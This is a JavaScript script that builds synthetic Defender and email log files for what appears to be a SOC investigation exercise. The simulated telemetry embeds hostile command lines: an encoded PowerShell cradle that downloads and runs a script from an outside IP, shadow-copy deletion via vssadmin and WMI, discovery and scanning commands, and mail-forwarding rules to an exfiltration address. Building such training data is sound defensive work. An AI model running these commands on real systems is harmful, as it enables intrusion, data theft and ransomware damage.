// Generates DeviceAlertEvents.json (~200 events) and EmailEvents.json (~150 events)
// to make INC-2026-0531..0534 (Defender / vssadmin) and INC-2026-0532 (mailbox/Tor) solvable via KQL.
// Re-runnable: overwrites the two files.
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const logDir = path.resolve(__dirname, "..", "server", "data", "logs");

// ===== Shared IOCs (must match alerts.json) =====
const TOR_IP = "185.220.101.47";
const TARGET_HOST = "WIN10-WS-047";
const TARGET_USER = "jamie.chen";
const TARGET_UPN = "jamie.chen@contoso.com";
const FILE_SRV = "FILE-SRV-001";
const ENC_PS_CMD =
  "powershell.exe -nop -w hidden -enc " +
  // base64 for: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/p.ps1')
  "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvcC5wczEnKQ==";

// ===== Helpers =====
const iso = (s) => new Date(s).toISOString();
const addSec = (base, sec) => new Date(new Date(base).getTime() + sec * 1000).toISOString();

// ============================================================
// DeviceAlertEvents — Defender for Endpoint alert/process events
// ============================================================
const deviceAlertEvents = [];

// --- Noise/baseline on other hosts (so it's not 100% one-host) ---
const otherHosts = [
  ["WS-MARKETING-002", "lara.kim"],
  ["WS-ENG-018", "ben.singh"],
  ["WS-HR-004", "ruby.gomez"],
  ["WS-FIN-014", "j.harrington"],
  ["WS-IT-002", "soc.analyst"],
];
let noiseT = new Date("2026-05-13T08:00:00Z").getTime();
for (let i = 0; i < 30; i++) {
  const [host, user] = otherHosts[i % otherHosts.length];
  deviceAlertEvents.push({
    Timestamp: iso(noiseT),
    DeviceName: host,
    AccountName: user,
    AlertTitle: "Informational: Defender heuristic suppressed",
    Severity: "Informational",
    Category: "Defense Evasion",
    FileName: "MsMpEng.exe",
    FolderPath: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2503.4-0\\MsMpEng.exe",
    ProcessCommandLine: "MsMpEng.exe /Scan -Quick",
    InitiatingProcessFileName: "services.exe",
    RemoteIP: "",
    RemoteUrl: "",
  });
  noiseT += 11 * 60 * 1000; // every 11 minutes
}

// --- Patient-zero macro chain on WIN10-WS-047 ---
// 14:05:00 — Outlook attachment saved to disk
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:05:02.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Office attachment written to temp folder",
  Severity: "Low",
  Category: "Initial Access",
  FileName: "Invoice-Q2.docm",
  FolderPath: "C:\\Users\\jamie.chen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7F3GZ12C\\Invoice-Q2.docm",
  ProcessCommandLine: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
  InitiatingProcessFileName: "OUTLOOK.EXE",
  RemoteIP: "",
  RemoteUrl: "",
});

// 14:06:14 — User opens Invoice-Q2.docm in Word
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:06:14.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Word document opened",
  Severity: "Informational",
  Category: "User Activity",
  FileName: "WINWORD.EXE",
  FolderPath: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
  ProcessCommandLine: "\"WINWORD.EXE\" /n \"C:\\Users\\jamie.chen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7F3GZ12C\\Invoice-Q2.docm\"",
  InitiatingProcessFileName: "explorer.exe",
  RemoteIP: "",
  RemoteUrl: "",
});

// 14:07:22 — WINWORD spawns encoded PowerShell (THE alert)
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:07:22.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Office application spawned encoded PowerShell",
  Severity: "High",
  Category: "Execution",
  FileName: "powershell.exe",
  FolderPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  ProcessCommandLine: ENC_PS_CMD,
  InitiatingProcessFileName: "WINWORD.EXE",
  RemoteIP: "",
  RemoteUrl: "",
});

// 14:07:24 — PowerShell outbound connection to attacker IP (downloads stage 2)
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:07:24.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Outbound connection to known anonymizer",
  Severity: "High",
  Category: "Command and Control",
  FileName: "powershell.exe",
  FolderPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  ProcessCommandLine: ENC_PS_CMD,
  InitiatingProcessFileName: "WINWORD.EXE",
  RemoteIP: TOR_IP,
  RemoteUrl: `http://${TOR_IP}/p.ps1`,
});

// 14:07:31 — Stage 2 dropper writes svchost-lookalike binary
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:07:31.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Suspicious binary written to Public folder",
  Severity: "Medium",
  Category: "Defense Evasion",
  FileName: "svchost.exe",
  FolderPath: "C:\\Users\\Public\\svchost.exe",
  ProcessCommandLine: "powershell.exe -nop -w hidden -enc <stage2>",
  InitiatingProcessFileName: "powershell.exe",
  RemoteIP: "",
  RemoteUrl: "",
});

// 14:10–14:25 — Beacons every minute to TOR_IP
let beaconT = new Date("2026-05-13T14:10:00Z").getTime();
for (let i = 0; i < 16; i++) {
  deviceAlertEvents.push({
    Timestamp: iso(beaconT),
    DeviceName: TARGET_HOST,
    AccountName: TARGET_USER,
    AlertTitle: "Periodic outbound — possible beaconing",
    Severity: "Medium",
    Category: "Command and Control",
    FileName: "svchost.exe",
    FolderPath: "C:\\Users\\Public\\svchost.exe",
    ProcessCommandLine: "svchost.exe",
    InitiatingProcessFileName: "powershell.exe",
    RemoteIP: TOR_IP,
    RemoteUrl: `https://${TOR_IP}:443/beacon`,
  });
  beaconT += 60 * 1000;
}

// 14:28 — Discovery: net.exe / whoami / nltest
const discoveryCmds = [
  ["whoami.exe", "whoami /all"],
  ["net.exe", "net group \"Domain Admins\" /domain"],
  ["nltest.exe", "nltest /domain_trusts"],
  ["systeminfo.exe", "systeminfo"],
  ["tasklist.exe", "tasklist /v"],
];
let discT = new Date("2026-05-13T14:28:00Z").getTime();
for (const [fname, cmd] of discoveryCmds) {
  deviceAlertEvents.push({
    Timestamp: iso(discT),
    DeviceName: TARGET_HOST,
    AccountName: TARGET_USER,
    AlertTitle: "LOLBin discovery command",
    Severity: "Medium",
    Category: "Discovery",
    FileName: fname,
    FolderPath: `C:\\Windows\\System32\\${fname}`,
    ProcessCommandLine: cmd,
    InitiatingProcessFileName: "svchost.exe",
    RemoteIP: "",
    RemoteUrl: "",
  });
  discT += 30 * 1000;
}

// 14:31 — Port scan from the host (the IDPS-triggering activity)
// Defender flags nmap.exe execution
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:31:02.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Network scanning tool executed",
  Severity: "High",
  Category: "Discovery",
  FileName: "nmap.exe",
  FolderPath: "C:\\Users\\Public\\nmap.exe",
  ProcessCommandLine: "nmap.exe -sS -p 22,80,135,139,389,443,445,1433,3389,5985,5986 -T4 10.0.2.0/24",
  InitiatingProcessFileName: "svchost.exe",
  RemoteIP: "",
  RemoteUrl: "",
});

// 14:53 — Compromised user (finance-controller) assigns GA via Graph
deviceAlertEvents.push({
  Timestamp: "2026-05-13T14:53:08.000Z",
  DeviceName: TARGET_HOST,
  AccountName: TARGET_USER,
  AlertTitle: "Outbound API call to Microsoft Graph",
  Severity: "Informational",
  Category: "Cloud",
  FileName: "powershell.exe",
  FolderPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  ProcessCommandLine: "powershell.exe -c \"Invoke-MgGraphRequest -Method POST -Uri /v1.0/roleManagement/directory/roleAssignments\"",
  InitiatingProcessFileName: "svchost.exe",
  RemoteIP: "20.190.151.5",
  RemoteUrl: "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments",
});

// 15:30 — Lateral movement via WMI to FILE-SRV-001
deviceAlertEvents.push({
  Timestamp: "2026-05-13T15:30:14.000Z",
  DeviceName: TARGET_HOST,
  AccountName: "svc-backup",
  AlertTitle: "Remote WMI process creation",
  Severity: "High",
  Category: "Lateral Movement",
  FileName: "wmic.exe",
  FolderPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
  ProcessCommandLine: `wmic.exe /node:${FILE_SRV} process call create "cmd.exe /c vssadmin delete shadows /all /quiet"`,
  InitiatingProcessFileName: "powershell.exe",
  RemoteIP: "10.0.4.10",
  RemoteUrl: "",
});

// 15:44:18 — vssadmin on WIN10-WS-047 (ALT-034 trigger #1)
deviceAlertEvents.push({
  Timestamp: "2026-05-13T15:44:18.000Z",
  DeviceName: TARGET_HOST,
  AccountName: "SYSTEM",
  AlertTitle: "Volume shadow copy deletion",
  Severity: "Critical",
  Category: "Impact",
  FileName: "vssadmin.exe",
  FolderPath: "C:\\Windows\\System32\\vssadmin.exe",
  ProcessCommandLine: "vssadmin.exe delete shadows /all /quiet",
  InitiatingProcessFileName: "powershell.exe",
  RemoteIP: "",
  RemoteUrl: "",
});

// 15:44:42 — vssadmin on FILE-SRV-001 (ALT-034 trigger #2)
deviceAlertEvents.push({
  Timestamp: "2026-05-13T15:44:42.000Z",
  DeviceName: FILE_SRV,
  AccountName: "SYSTEM",
  AlertTitle: "Volume shadow copy deletion",
  Severity: "Critical",
  Category: "Impact",
  FileName: "vssadmin.exe",
  FolderPath: "C:\\Windows\\System32\\vssadmin.exe",
  ProcessCommandLine: "vssadmin.exe delete shadows /all /quiet",
  InitiatingProcessFileName: "wmic.exe",
  RemoteIP: "",
  RemoteUrl: "",
});

// 15:46+ — Mass file rename (encryption) on FILE-SRV-001 — 30 sample events
let encT = new Date("2026-05-13T15:46:00Z").getTime();
const samplePaths = [
  "Finance\\Q1-Report.xlsx",
  "HR\\Employees-2026.docx",
  "Engineering\\Roadmap.pptx",
  "Legal\\Contracts-Master.pdf",
  "Sales\\Pipeline-EMEA.xlsx",
];
for (let i = 0; i < 30; i++) {
  const p = samplePaths[i % samplePaths.length];
  deviceAlertEvents.push({
    Timestamp: iso(encT),
    DeviceName: FILE_SRV,
    AccountName: "SYSTEM",
    AlertTitle: "Mass file rename — possible encryption",
    Severity: "Critical",
    Category: "Impact",
    FileName: "svchost.exe",
    FolderPath: "C:\\Users\\Public\\svchost.exe",
    ProcessCommandLine: `rename "${p}" "${p}.LOCKD"`,
    InitiatingProcessFileName: "svchost.exe",
    RemoteIP: "",
    RemoteUrl: "",
  });
  encT += 2 * 1000;
}

// Pad to ~200 with low-severity benign Defender hits across the day
const benignHosts = ["WS-MARKETING-002", "WS-ENG-018", "WS-HR-004", "WS-IT-002"];
let padT = new Date("2026-05-13T00:00:00Z").getTime();
while (deviceAlertEvents.length < 200) {
  deviceAlertEvents.push({
    Timestamp: iso(padT),
    DeviceName: benignHosts[deviceAlertEvents.length % benignHosts.length],
    AccountName: "user" + (deviceAlertEvents.length % 7),
    AlertTitle: "Cloud-delivered protection block",
    Severity: "Low",
    Category: "Malware",
    FileName: "browser.exe",
    FolderPath: "C:\\Program Files\\BrowserCorp\\browser.exe",
    ProcessCommandLine: "browser.exe --check-update",
    InitiatingProcessFileName: "explorer.exe",
    RemoteIP: "13.107.42.13",
    RemoteUrl: "https://browser-update.example.com",
  });
  padT += 7 * 60 * 1000;
}

deviceAlertEvents.sort((a, b) => a.Timestamp.localeCompare(b.Timestamp));

// ============================================================
// EmailEvents — Office 365 / Defender for O365
// ============================================================
const emailEvents = [];

// --- Phishing entry: typosquat sends Invoice-Q2.docm to jamie.chen ---
emailEvents.push({
  TimeGenerated: "2026-05-13T13:58:11.000Z",
  Operation: "EmailDelivered",
  UserId: TARGET_UPN,
  MailboxId: TARGET_UPN,
  SrcIP: "203.0.113.74",
  ClientIP: "203.0.113.74",
  SenderFromAddress: "billing@cont0so.com",
  RecipientEmailAddress: TARGET_UPN,
  Subject: "Re: Outstanding invoice — Q2 2026",
  Attachment: "Invoice-Q2.docm",
  ResultStatus: "Delivered",
});
emailEvents.push({
  TimeGenerated: "2026-05-13T14:04:42.000Z",
  Operation: "AttachmentOpened",
  UserId: TARGET_UPN,
  MailboxId: TARGET_UPN,
  SrcIP: "10.4.5.114",
  ClientIP: "10.4.5.114",
  SenderFromAddress: "billing@cont0so.com",
  RecipientEmailAddress: TARGET_UPN,
  Subject: "Re: Outstanding invoice — Q2 2026",
  Attachment: "Invoice-Q2.docm",
  ResultStatus: "Opened",
});

// --- BEC / Tor mailbox access for finance team (ALT-032) ---
const financeMailboxes = [
  "ap@contoso.com",
  "ar@contoso.com",
  "payroll@contoso.com",
  "controller@contoso.com",
];
let mbT = new Date("2026-05-13T09:18:00Z").getTime();
for (const mb of financeMailboxes) {
  // MailItemsAccessed from Tor
  emailEvents.push({
    TimeGenerated: iso(mbT),
    Operation: "MailItemsAccessed",
    UserId: mb,
    MailboxId: mb,
    SrcIP: TOR_IP,
    ClientIP: TOR_IP,
    SenderFromAddress: "",
    RecipientEmailAddress: mb,
    Subject: "[bulk session — 142 items]",
    Attachment: "",
    ResultStatus: "Success",
  });
  mbT += 60 * 1000;
}
// Two auto-forward rule creations
emailEvents.push({
  TimeGenerated: "2026-05-13T09:23:11.000Z",
  Operation: "New-InboxRule",
  UserId: "ap@contoso.com",
  MailboxId: "ap@contoso.com",
  SrcIP: TOR_IP,
  ClientIP: TOR_IP,
  SenderFromAddress: "",
  RecipientEmailAddress: "exfil-drop@protonmail.com",
  Subject: "",
  Attachment: "",
  ResultStatus: "Created (Name: '.', ForwardTo: exfil-drop@protonmail.com, SubjectContains: invoice;wire;payment)",
});
emailEvents.push({
  TimeGenerated: "2026-05-13T09:23:48.000Z",
  Operation: "New-InboxRule",
  UserId: "controller@contoso.com",
  MailboxId: "controller@contoso.com",
  SrcIP: TOR_IP,
  ClientIP: TOR_IP,
  SenderFromAddress: "",
  RecipientEmailAddress: "exfil-drop@protonmail.com",
  Subject: "",
  Attachment: "",
  ResultStatus: "Created (Name: ' ', ForwardTo: exfil-drop@protonmail.com, MoveToFolder: RSS Subscriptions)",
});

// Compromised account assigns GA role — but that lands in AzureActivity, not here.
// We do log finance-controller's session start from Tor 6h earlier (per alert ruleDescription)
emailEvents.push({
  TimeGenerated: "2026-05-13T08:53:11.000Z",
  Operation: "OAuthTokenIssued",
  UserId: "finance-controller@contoso.com",
  MailboxId: "finance-controller@contoso.com",
  SrcIP: TOR_IP,
  ClientIP: TOR_IP,
  SenderFromAddress: "",
  RecipientEmailAddress: "",
  Subject: "",
  Attachment: "",
  ResultStatus: "Refresh token replayed (no MFA challenge)",
});

// --- Baseline noise ---
const baselineSenders = [
  ["mailer@contoso.com", "All-hands reminder"],
  ["jira@contoso.com", "[JIRA] CRT-123 updated"],
  ["github@contoso.com", "[PR] feature/login merged"],
  ["calendar@microsoft.com", "Meeting: weekly sync"],
];
let noiseEmailT = new Date("2026-05-13T06:00:00Z").getTime();
while (emailEvents.length < 150) {
  const [from, subj] = baselineSenders[emailEvents.length % baselineSenders.length];
  const user = ["jamie.chen", "j.harrington", "ben.singh", "ap", "ruby.gomez", "ar"][
    emailEvents.length % 6
  ];
  emailEvents.push({
    TimeGenerated: iso(noiseEmailT),
    Operation: "EmailDelivered",
    UserId: `${user}@contoso.com`,
    MailboxId: `${user}@contoso.com`,
    SrcIP: "40.92.66.18",
    ClientIP: "40.92.66.18",
    SenderFromAddress: from,
    RecipientEmailAddress: `${user}@contoso.com`,
    Subject: subj,
    Attachment: "",
    ResultStatus: "Delivered",
  });
  noiseEmailT += 4 * 60 * 1000;
}

emailEvents.sort((a, b) => a.TimeGenerated.localeCompare(b.TimeGenerated));

// ============================================================
fs.writeFileSync(
  path.join(logDir, "DeviceAlertEvents.json"),
  JSON.stringify(deviceAlertEvents, null, 2) + "\n",
  "utf8",
);
fs.writeFileSync(
  path.join(logDir, "EmailEvents.json"),
  JSON.stringify(emailEvents, null, 2) + "\n",
  "utf8",
);
console.log(
  `Wrote DeviceAlertEvents (${deviceAlertEvents.length}) and EmailEvents (${emailEvents.length}).`,
);
